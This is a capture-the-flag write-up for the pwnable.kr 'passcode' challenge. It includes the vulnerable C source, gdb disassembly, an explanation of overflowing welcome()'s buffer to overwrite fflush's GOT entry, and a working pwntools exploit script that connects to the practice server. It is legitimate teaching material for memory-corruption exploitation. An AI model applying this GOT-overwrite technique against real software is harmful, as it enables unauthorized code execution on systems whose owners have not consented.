# Pwnable.kr Passcode CTF Writeup
## Problem Description
The code provided for the challenge is as follows:

```c
void login(){
    int passcode1;
    int passcode2;

    printf("enter passcode1 : ");
    scanf("%d", passcode1);
    fflush(stdin);

    // ha! mommy told me that 32bit is vulnerable to bruteforcing :)
    printf("enter passcode2 : ");
    scanf("%d", passcode2);

    printf("checking...\n");
    if(passcode1 == 338150 && passcode2 == 13371337){
        printf("Login OK!\n");
        system("/bin/cat flag");
    }
    else{
        printf("Login Failed!\n");
        exit(0);
    }
}

void welcome(){
    char name[100];
    printf("enter your name : ");
    scanf("%100s", name);
    printf("Welcome %s!\n", name);
}

int main(){
    printf("Toddler's Secure Login System 1.0 beta.\n");

    welcome();
    login();

    // something after login...
    printf("Now I can safely trust you that you have credentials :)\n");
    return 0;
}
```
Here's the disassembly:
```asm
(gdb) disas welcome
Dump of assembler code for function welcome:
   0x08048609 <+0>:	push   %ebp
   0x0804860a <+1>:	mov    %esp,%ebp
   0x0804860c <+3>:	sub    $0x88,%esp
   0x08048612 <+9>:	mov    %gs:0x14,%eax
   0x08048618 <+15>:	mov    %eax,-0xc(%ebp)
   0x0804861b <+18>:	xor    %eax,%eax
   0x0804861d <+20>:	mov    $0x80487cb,%eax
   0x08048622 <+25>:	mov    %eax,(%esp)
   0x08048625 <+28>:	call   0x8048420 <printf@plt>
   0x0804862a <+33>:	mov    $0x80487dd,%eax
   0x0804862f <+38>:	lea    -0x70(%ebp),%edx
   0x08048632 <+41>:	mov    %edx,0x4(%esp)
   0x08048636 <+45>:	mov    %eax,(%esp)
   0x08048639 <+48>:	call   0x80484a0 <__isoc99_scanf@plt>
   0x0804863e <+53>:	mov    $0x80487e3,%eax
   0x08048643 <+58>:	lea    -0x70(%ebp),%edx
   0x08048646 <+61>:	mov    %edx,0x4(%esp)
   0x0804864a <+65>:	mov    %eax,(%esp)
   0x0804864d <+68>:	call   0x8048420 <printf@plt>
   0x08048652 <+73>:	mov    -0xc(%ebp),%eax
   0x08048655 <+76>:	xor    %gs:0x14,%eax
   0x0804865c <+83>:	je     0x8048663 <welcome+90>
   0x0804865e <+85>:	call   0x8048440 <__stack_chk_fail@plt>
   0x08048663 <+90>:	leave  
   0x08048664 <+91>:	ret    
End of assembler dump.

(gdb) disas login
Dump of assembler code for function login:
   0x08048564 <+0>:	push   %ebp
   0x08048565 <+1>:	mov    %esp,%ebp
   0x08048567 <+3>:	sub    $0x28,%esp
   0x0804856a <+6>:	mov    $0x8048770,%eax
   0x0804856f <+11>:	mov    %eax,(%esp)
   0x08048572 <+14>:	call   0x8048420 <printf@plt>
   0x08048577 <+19>:	mov    $0x8048783,%eax
   0x0804857c <+24>:	mov    -0x10(%ebp),%edx
   0x0804857f <+27>:	mov    %edx,0x4(%esp)
   0x08048583 <+31>:	mov    %eax,(%esp)
   0x08048586 <+34>:	call   0x80484a0 <__isoc99_scanf@plt>
   0x0804858b <+39>:	mov    0x804a02c,%eax
   0x08048590 <+44>:	mov    %eax,(%esp)
   0x08048593 <+47>:	call   0x8048430 <fflush@plt>
   0x08048598 <+52>:	mov    $0x8048786,%eax
   0x0804859d <+57>:	mov    %eax,(%esp)
   0x080485a0 <+60>:	call   0x8048420 <printf@plt>
   0x080485a5 <+65>:	mov    $0x8048783,%eax
   0x080485aa <+70>:	mov    -0xc(%ebp),%edx
   0x080485ad <+73>:	mov    %edx,0x4(%esp)
   0x080485b1 <+77>:	mov    %eax,(%esp)
   0x080485b4 <+80>:	call   0x80484a0 <__isoc99_scanf@plt>
   0x080485b9 <+85>:	movl   $0x8048799,(%esp)
   0x080485c0 <+92>:	call   0x8048450 <puts@plt>
   0x080485c5 <+97>:	cmpl   $0x528e6,-0x10(%ebp)
   0x080485cc <+104>:	jne    0x80485f1 <login+141>
   0x080485ce <+106>:	cmpl   $0xcc07c9,-0xc(%ebp)
   0x080485d5 <+113>:	jne    0x80485f1 <login+141>
   0x080485d7 <+115>:	movl   $0x80487a5,(%esp)
   0x080485de <+122>:	call   0x8048450 <puts@plt>
   0x080485e3 <+127>:	movl   $0x80487af,(%esp)
   0x080485ea <+134>:	call   0x8048460 <system@plt>
   0x080485ef <+139>:	leave  
   0x080485f0 <+140>:	ret    
   0x080485f1 <+141>:	movl   $0x80487bd,(%esp)
   0x080485f8 <+148>:	call   0x8048450 <puts@plt>
   0x080485fd <+153>:	movl   $0x0,(%esp)
   0x08048604 <+160>:	call   0x8048480 <exit@plt>
End of assembler dump.
```
## Analysis
### Vulnerability in login() Function
The key issue is in the following line:
```c
scanf("%d", passcode1);
```
This line is incorrect because scanf expects the address of the variable to store the input, not the variable itself. Only if passcode1 had a value that was an address, the scanf could run normally. However, we cannot directly modify `passcode1`. To exploit this, we can leverage a buffer overflow in the `welcome()` function, where the name variable is stored in a buffer of size 100 bytes.

### Memory Layout
In the assembly code for `welcome()`, we see:
```asm
lea -0x70(%ebp),%edx
```
This means the name variable starts at `-0x70(%ebp)`.

In the `login()` function, we see:
```asm
mov -0x10(%ebp),%edx
```
This means `passcode1` is stored at `-0x10(%ebp)`.
Calculating the difference between these two addresses:
`0x70 - 0x10 = 0x60 = 96 (decimal)`
Since the name buffer is 100 bytes long, we can overwrite the value of `passcode1` by inputting 96 bytes plus an additional 4 bytes to control `passcode1`.
Now we can change anything we want in the memory. So, what should we change?

### Exploiting fflush
The `fflush` function doesn't seem to do anything significant, but let's look at the assembly code:
```asm
(gdb) disas fflush
Dump of assembler code for function fflush@plt:
   0x08048430 <+0>:	jmp    *0x804a004
   0x08048436 <+6>:	push   $0x8
   0x0804843b <+11>:	jmp    0x8048410
```
What's interesting is in this line: `jmp *0x804a004`. This instruction means that `fflush` will jump to the address stored at `0x804a004`. If we could overwrite the value at `0x804a004`, we could control where the program jumps.
By setting `passcode1` to `0x804a004` (using the overflow), we can then input the address we want to jump to in the scanf call for `passcode1`.
Obviously, We want to jump to the address of `system("/bin/cat flag")`, which is `0x080485e3`, so that will be our input.

## Exploit Code
```python
from pwn import *

c = ssh(host='pwnable.kr', user='passcode', password='guest', port=2222)

process = c.process('./passcode')

# Craft payload to overflow and overwrite passcode1
payload = b'A' * 96 + p32(0x804a004)
process.sendline(payload)

# Input the address of system("/bin/cat flag")
payload2 = str(int(0x080485e3))
process.sendline(payload2)

process.interactive()
c.close()
```
